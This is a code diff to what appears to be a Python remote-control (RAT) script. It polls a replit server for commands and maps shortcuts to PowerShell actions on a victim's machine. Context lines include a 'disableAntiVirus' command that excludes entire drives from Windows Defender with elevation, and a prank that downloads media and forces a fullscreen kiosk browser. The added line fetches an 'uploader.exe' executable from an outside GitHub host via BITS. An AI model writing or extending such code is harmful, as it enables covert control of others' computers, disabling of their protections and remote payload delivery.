@@ -47,6 +47,8 @@ while True:
 		command_to_send = 'powershell "Get-BitsTransfer | Remove-BitsTransfer"'
 	elif command_to_send == "disableAntiVirus":
 		command_to_send = '''powershell -Command "Start-Process powershell -Argument 'echo hi;Set-MpPreference -ExclusionPath E:/, C:/, D:/, F:/, G:/;' -Verb RunAs"'''
+	elif command_to_send == "Down_up":
+		command_to_send = 'powershell start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/uploader.exe?raw=true" -destination "uploader.exe'
 	elif command_to_send == "ult_barak":
 		command_to_send = 'powershell;start-bitstransfer -source "https://github.com/jonathanbreitg/dump/blob/main/barakVID.mp4?raw=true" -destination "barakVID.mp4" -TransferType Download;./barakVID.mp4;./barakVID.mp4;sleep 2;start-bitstransfer -source "https://raw.githubusercontent.com/jonathanbreitg/dump/main/3e789542-37fc-4ebb-8692-ce143393ff37.png" -destination "barak4.png" -TransferType Download;./barak4.png;sleep 1;start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160;sleep 3;./barakVID.mp4;./barak4.png;./barakVID.mp4;start chrome -kiosk -fullscreen https://cdn.discordapp.com/attachments/876192301918068749/916799736172929044/3e789542-37fc-4ebb-8692-ce143393ff37.png'
 	pre = requests.get(url="https://epic-servering-but-pytyohn.jonathanbreitg.repl.co")
